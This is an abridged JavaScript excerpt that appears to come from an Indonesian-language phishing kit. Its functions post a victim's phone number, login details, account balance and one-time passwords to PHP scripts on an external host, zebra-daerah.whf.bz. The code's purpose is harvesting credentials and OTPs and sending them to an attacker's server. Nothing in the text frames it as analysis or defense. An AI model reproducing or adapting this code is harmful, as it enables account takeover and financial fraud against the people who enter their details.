function sendHp() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/12/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/12/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/12/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/12/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/12/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/12/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/12/otpblm.php',
      type: 'POST',
